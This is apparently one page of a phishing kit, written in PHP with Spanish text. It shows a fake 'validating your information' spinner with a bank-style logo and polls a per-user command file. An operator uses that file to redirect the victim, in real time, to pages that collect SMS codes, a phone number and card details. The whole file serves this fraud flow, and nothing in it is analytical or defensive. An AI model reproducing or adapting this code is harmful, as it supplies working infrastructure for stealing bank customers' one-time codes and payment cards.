<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (strpos($accion, "LOGINERROR|") === 0) {
        $partes = explode("|", $accion);
        $dispositivo = $partes[2] ?? 'pc';
        if ($dispositivo === "pc") {
            header("Location: indexpc2.html");
        } else {
            header("Location: indexmovil2.html");
        }
        exit;
    }

    switch ($accion) {
        case "/SMS":
            header("Location: sms.php");
            break;
        case "/SMS2":
            header("Location: sms2.php");
            break;
        case "/LOGIN":
            header("Location: index.php");
            break;
        case "/SMSERROR":
            header("Location: smserror.php");
            break;
        case "/NUMERO":
            header("Location: numero.php");
            break;
        case "/CARD":
            header("Location: tarjeta.php");
            break;
        case "/ERROR":
            header("Location: index2.php");
            break;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3">
    <title>Validando...</title>
    <style>
        body {
            background-color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .loader {
            width: 150px;
            height: 150px;
            background: url('img/logo-avanz-mini.png') no-repeat center;
            background-size: contain;
            animation: spin 0.8s linear infinite, pauseEffect 0.3s infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(120deg); }
            50% { transform: rotate(240deg); }
            75% { transform: rotate(300deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pauseEffect {
            0%, 20%, 40%, 60%, 80%, 100% { animation-play-state: running; }
            10%, 30%, 50%, 70%, 90% { animation-play-state: paused; }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div>
        <p style="font-family: sans-serif; font-size: 15px;">Estamos validando su información...</p>
    </div>
</body>
</html>
